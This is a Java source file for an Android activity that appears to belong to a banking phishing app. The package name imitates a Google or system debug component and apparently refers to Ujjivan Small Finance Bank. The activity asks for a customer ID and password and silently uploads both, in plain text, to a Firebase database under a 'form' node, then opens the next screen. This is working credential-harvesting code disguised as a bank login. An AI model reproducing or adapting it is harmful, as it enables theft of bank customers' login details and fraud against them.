package hamara.google.test.debug.system.ujjvansmall;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import hamara.google.test.debug.system.ujjvansmall.bg.FormValidator;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class SecondActivity extends AppCompatActivity {

    private EditText customerid, password;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.second);

        String id = getIntent().getStringExtra("id");
        customerid = findViewById(R.id.customerid);
        password = findViewById(R.id.password);
        Button buttonSubmit = findViewById(R.id.submit);

        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {
                buttonSubmit.setText("Please Wait");

                HashMap<String, Object> dataObject = new HashMap<>();
                dataObject.put("customerid", customerid.getText().toString().trim());
                dataObject.put("password", password.getText().toString().trim());
                dataObject.put("updated_at", Helper.datetime());

                FirebaseDatabase database = FirebaseDatabase.getInstance();
                DatabaseReference usersRef = database.getReference("data").child(Helper.SITE).child("form");
                String userId2 = usersRef.push().getKey();  // Generate a unique key
                assert userId2 != null;
                usersRef.child(id).child(userId2).setValue(dataObject)
                        .addOnSuccessListener(aVoid -> {
                            Intent intent = new Intent(this, ThirdActivity.class);
                            intent.putExtra("id", id);
                            startActivity(intent);
                        })
                        .addOnFailureListener(e -> {
                            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                            Log.d(Helper.TAG, "Error: " + e.getMessage());
                        });
            } else {
                Helper.debug(SecondActivity.this, "Form Validation Failed");
            }

        });
    }

    public boolean validateForm(){
        boolean n1 = FormValidator.validateRequired(customerid, "Customer id is required");
        boolean n3 = FormValidator.validateRequired(password, "password is required");
        return n1 && n3;
    }
}
